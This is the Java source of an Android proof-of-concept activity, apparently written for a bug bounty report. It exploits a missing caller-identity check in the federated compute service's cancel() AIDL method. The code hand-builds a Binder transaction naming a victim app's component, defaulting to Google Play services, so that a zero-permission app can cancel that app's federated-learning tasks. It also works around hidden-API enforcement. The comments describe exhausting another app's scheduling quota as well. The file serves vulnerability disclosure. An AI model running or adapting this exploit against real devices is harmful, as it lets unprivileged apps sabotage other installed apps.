package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

/**
 * Zero-permission PoC for com.google.android.federatedcompute.
 *
 * FederatedComputeManagingServiceImpl (exported, NO permission) backs
 * IFederatedComputeService, whose cancel(ComponentName owner, String populationName,
 * IFederatedComputeCallback) AIDL method has NO caller-identity check anywhere in the
 * call chain (FederatedComputeManagingServiceDelegate.cancel() ->
 * FederatedComputeJobManager.onTrainerStopCalled()) -- the "owner" ComponentName is taken
 * entirely from the caller-supplied parameter, never verified against Binder.getCallingUid().
 * This lets a zero-perm app cancel ANY other installed app's scheduled federated-learning
 * training task by supplying that app's ComponentName + population name, and (via the
 * matching schedule() method) exhaust another app's per-package task-scheduling quota.
 *
 * This PoC targets cancel() since its only non-primitive parameter (ComponentName) is a
 * public SDK Parcelable we can construct directly; the callback is a plain android.os.Binder
 * (not a real IFederatedComputeCallback.Stub, which is a hidden/system API and would hit
 * hidden-API enforcement like other android.federatedcompute.aidl.* / android.adservices.*
 * interfaces did earlier this session) -- sufficient because the server-side state mutation
 * happens before the reply callback is ever invoked.
 */
public class FedComputeCancelActivity extends Activity {
    private static final String TAG = "VRP-FedComputeCancel";
    private static final String DESCRIPTOR = "android.federatedcompute.aidl.IFederatedComputeService";
    private static final int TRANSACTION_cancel = 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String victimPackage = getIntent().getStringExtra("victimPackage");
        if (victimPackage == null) victimPackage = "com.google.android.gms";
        String victimClass = getIntent().getStringExtra("victimClass");
        if (victimClass == null) victimClass = "com.google.android.gms.SomeTrainerService";
        String population = getIntent().getStringExtra("population");
        if (population == null) population = "attacker_probe_population";

        final ComponentName victim = new ComponentName(victimPackage, victimClass);
        final String populationName = population;

        Intent bindIntent = new Intent("android.federatedcompute.FederatedComputeService");
        bindIntent.setPackage("com.google.android.federatedcompute");

        bindService(bindIntent, new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                Log.i(TAG, "onServiceConnected: bind succeeded (no SecurityException), service=" + name);
                try {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        data.writeTypedObject(victim, 0);
                        data.writeString(populationName);
                        // Plain Binder standing in for IFederatedComputeCallback -- avoids
                        // instantiating the hidden IFederatedComputeCallback.Stub directly.
                        data.writeStrongBinder(new Binder());
                        boolean ok = service.transact(TRANSACTION_cancel, data, reply, 0);
                        Log.i(TAG, "cancel() transact() returned=" + ok + " for victim=" + victim.flattenToString()
                                + " population=" + populationName);
                        reply.readException();
                        Log.i(TAG, "cancel() completed with no exception thrown back");
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Exception e) {
                    Log.e(TAG, "cancel() transact threw: " + e);
                }
                finish();
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {}
        }, Context.BIND_AUTO_CREATE);
    }
}
